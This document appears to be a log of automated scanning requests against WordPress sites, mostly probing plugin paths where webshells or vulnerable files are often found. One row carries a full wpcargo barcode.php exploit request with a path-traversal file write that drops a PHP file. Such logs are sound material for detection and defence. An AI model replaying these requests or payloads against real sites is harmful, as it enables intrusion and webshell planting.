"ip","time","path","useragent","source"
"172.70.143.214","2025-08-15T01:01:42Z","/wp-content/plugins/HelloDollyV2/hello_dolly_v2.php","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.69.176.127","2025-08-15T01:01:46Z","/wp-content/plugins/HelloDollyV2/hello_dolly_v2.php","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.68.164.38","2025-08-15T01:04:25Z","/wp-content/plugins/fix/up.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36","plugin_php"
"104.23.175.82","2025-08-15T01:04:25Z","/wp-content/plugins/apikey/apikey.php?test=hello","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.70.188.102","2025-08-15T01:04:54Z","/wp-content/plugins/wpcargo/includes/barcode.php?text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath=../../../renvoza31337.php","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36","plugin_php"
"172.70.208.66","2025-08-15T01:07:50Z","/wp-content/plugins/hide-my-wp/filepath.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36","plugin_php"
"172.70.189.163","2025-08-15T01:11:03Z","/wp-content/plugins/backup-backup/includes/backup-heart.php","Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1","plugin_php"
"172.69.166.115","2025-08-15T01:39:29Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.69.176.94","2025-08-15T01:39:30Z","/wp-content/plugins/Core-Econ/index.php","-","plugin_php"
"172.69.166.109","2025-08-15T01:59:01Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
